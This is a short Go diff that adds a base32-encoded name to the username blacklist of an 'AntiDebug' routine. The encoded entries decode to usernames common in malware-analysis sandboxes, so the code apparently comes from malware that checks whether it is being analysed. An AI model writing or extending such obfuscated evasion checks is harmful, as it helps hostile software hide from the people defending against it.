@@ -40,6 +40,7 @@ type AntiDebug struct {
 
 func NewAntiDebug() *AntiDebug {
 	blackListedUsers := []string{
+		"IJZHK3TP",
 		"IFSG22LONFZXI4TBORXXE===",
 		"K5CECR2VORUWY2LUPFAWGY3POVXHI===",
 		"IFRGE6I=",
